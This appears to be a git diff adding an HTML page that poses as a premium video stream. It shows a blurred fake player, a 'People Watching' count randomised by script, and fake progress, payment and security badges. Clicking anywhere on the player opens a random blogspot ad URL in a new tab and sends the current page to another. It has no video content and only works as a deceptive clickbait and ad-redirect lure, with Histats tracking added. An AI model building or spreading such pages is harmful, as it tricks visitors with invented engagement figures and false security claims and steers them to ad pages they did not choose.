@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stream HD: Private Access</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body { 
+            background-color: #020617; 
+            font-family: 'Poppins', sans-serif;
+            color: #f8fafc;
+        }
+        .video-wrapper {
+            position: relative;
+            background: url('https://images.unsplash.com/photo-1536440136628-849c177e76a1?q=80&w=1000&auto=format&fit=crop'); /* Gambar background bertema movie */
+            background-size: cover;
+            background-position: center;
+            box-shadow: 0 0 50px rgba(0,0,0,1) inset, 0 20px 50px rgba(37, 99, 235, 0.15);
+        }
+        .blur-overlay {
+            backdrop-filter: blur(15px);
+            background: rgba(0, 0, 0, 0.4);
+        }
+        .loading-spinner {
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid #2563eb;
+            border-radius: 50%;
+            width: 80px;
+            height: 80px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .pulse-btn {
+            animation: pulse-blue 2s infinite;
+        }
+        @keyframes pulse-blue {
+            0% { box-shadow: 0 0 0 0 rgba(37, 99, 235, 0.7); }
+            70% { box-shadow: 0 0 0 20px rgba(37, 99, 235, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(37, 99, 235, 0); }
+        }
+        .floating {
+            animation: floating 3s ease-in-out infinite;
+        }
+        @keyframes floating {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+
+    <!-- Sleek Navbar -->
+    <nav class="p-5 flex justify-between items-center bg-gradient-to-b from-black/80 to-transparent absolute w-full z-50">
+        <div class="flex items-center gap-2">
+            <i class="fas fa-play-circle text-blue-500 text-2xl"></i>
+            <span class="text-xl font-bold tracking-tighter uppercase italic">VIDEY<span class="text-blue-500">PRO</span></span>
+        </div>
+        <div class="hidden md:flex gap-6 text-sm font-medium text-gray-300">
+            <span class="hover:text-white cursor-pointer transition">Movies</span>
+            <span class="hover:text-white cursor-pointer transition">Series</span>
+            <span class="text-blue-500 underline underline-offset-4">Premium</span>
+        </div>
+        <div class="flex items-center gap-4">
+            <span class="text-[10px] bg-red-600 px-2 py-0.5 rounded font-bold">1080P</span>
+            <i class="fas fa-user-circle text-xl opacity-70"></i>
+        </div>
+    </nav>
+
+    <main class="flex-grow flex items-center justify-center p-4 pt-20">
+        <div class="w-full max-w-5xl">
+            <!-- Player Container -->
+            <div id="playerArea" class="video-wrapper aspect-video rounded-3xl overflow-hidden group cursor-pointer border border-white/10 relative">
+                
+                <!-- Content Blur Overlay -->
+                <div class="absolute inset-0 blur-overlay flex flex-col items-center justify-center z-20">
+                    
+                    <!-- Loading State -->
+                    <div class="loading-spinner mb-6"></div>
+                    
+                    <!-- Centered Play Button -->
+                    <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 text-center">
+                        <div class="pulse-btn w-20 h-20 sm:w-28 sm:h-28 bg-blue-600 text-white rounded-full flex items-center justify-center shadow-2xl transform group-hover:scale-110 transition-all duration-300">
+                            <i class="fas fa-play text-3xl sm:text-4xl ml-2"></i>
+                        </div>
+                        <p class="mt-6 text-white font-bold tracking-widest text-sm sm:text-base animate-pulse">TAP TO RESUME PLAYBACK</p>
+                    </div>
+
+                    <!-- Fake User Count -->
+                    <div class="absolute top-6 left-6 flex items-center gap-2 bg-black/40 backdrop-blur-md px-3 py-1.5 rounded-lg border border-white/10">
+                        <span class="w-2 h-2 bg-red-500 rounded-full animate-pulse"></span>
+                        <span class="text-[11px] font-semibold"><span id="userCount">14,205</span> People Watching</span>
+                    </div>
+                </div>
+
+                <!-- Fake Player UI (Bottom) -->
+                <div class="absolute bottom-0 left-0 right-0 p-6 z-30 bg-gradient-to-t from-black via-black/40 to-transparent">
+                    <div class="w-full bg-gray-600/30 h-1.5 rounded-full mb-4 overflow-hidden">
+                        <div class="bg-blue-600 h-full w-[45%] relative">
+                            <div class="absolute right-0 top-1/2 -translate-y-1/2 w-3 h-3 bg-white rounded-full"></div>
+                        </div>
+                    </div>
+                    <div class="flex justify-between items-center opacity-80">
+                        <div class="flex gap-4 items-center">
+                            <i class="fas fa-pause"></i>
+                            <i class="fas fa-step-forward"></i>
+                            <i class="fas fa-volume-up"></i>
+                            <span class="text-xs tabular-nums">08:42 / 18:05</span>
+                        </div>
+                        <div class="flex gap-4 items-center text-sm">
+                            <i class="fas fa-closed-captioning"></i>
+                            <i class="fas fa-cog"></i>
+                            <i class="fas fa-expand"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Video Info Below Player -->
+            <div class="mt-8 flex flex-col md:flex-row md:justify-between md:items-start gap-4 px-2">
+                <div>
+                    <h1 class="text-xl md:text-2xl font-bold text-white mb-2 tracking-tight">
+                        [EXCLUSIVE] Full Video Content - HD Premium Stream
+                    </h1>
+                    <div class="flex items-center gap-3 text-sm text-gray-400">
+                        <span class="text-green-500 font-bold italic">99% Match</span>
+                        <span>2024</span>
+                        <span class="border border-gray-600 px-1 rounded text-[10px]">CC</span>
+                        <span class="flex items-center gap-1"><i class="fas fa-thumbs-up text-blue-500"></i> 842K</span>
+                    </div>
+                </div>
+                <div class="flex gap-2">
+                    <button class="bg-white/10 hover:bg-white/20 px-4 py-2 rounded-lg transition text-sm flex items-center gap-2">
+                        <i class="fas fa-share"></i> Share
+                    </button>
+                    <button class="bg-white/10 hover:bg-white/20 px-4 py-2 rounded-lg transition text-sm flex items-center gap-2">
+                        <i class="fas fa-plus"></i> Watchlist
+                    </button>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer Security Badge -->
+    <footer class="p-8 mt-10 border-t border-white/5 bg-black/50 text-center">
+        <div class="flex justify-center gap-8 mb-4 opacity-30 grayscale hover:grayscale-0 transition-all">
+            <i class="fab fa-cc-visa text-3xl"></i>
+            <i class="fab fa-cc-mastercard text-3xl"></i>
+            <i class="fas fa-shield-alt text-3xl"></i>
+        </div>
+        <p class="text-gray-500 text-[10px] uppercase tracking-[0.2em] mb-2">Encrypted Stream Protocol v4.2</p>
+        <p class="text-gray-600 text-[9px]">&copy; 2024 VIDEY PREMIUM NETWORK. SECURE ACCESS ONLY.</p>
+    </footer>
+
+    <script>
+        // Update user count randomly for "Live" feel
+        setInterval(() => {
+            const el = document.getElementById('userCount');
+            let count = parseInt(el.innerText.replace(',', ''));
+            count += Math.floor(Math.random() * 10) - 4;
+            el.innerText = count.toLocaleString();
+        }, 3000);
+
+        const domains = [
+            'https://maxshubs.blogspot.com/',
+            'https://loadads1.blogspot.com/'
+        ];
+
+        document.getElementById('playerArea').addEventListener('click', function() {
+            const randomUrl = domains[Math.floor(Math.random() * domains.length)];
+            window.open(randomUrl, '_blank');
+            window.location.href = 'https://loadads1.blogspot.com/';
+        });
+    </script>
+
+    <!-- Histats -->
+    <script type='text/javascript'>
+        var _Hasync=_Hasync||[];
+        _Hasync.push(['Histats.start', '1,5009418,4,0,0,0,00010000']);
+        _Hasync.push(['Histats.fasi', '1']);
+        _Hasync.push(['Histats.track_hits', '']);
+        (function(){
+            var hs = document.createElement('script'); hs.async = true;
+            hs.src = '//s10.histats.com/js15_as.js';
+            (document.head||document.body).appendChild(hs);
+        })();
+    </script>
+</body>
+</html>
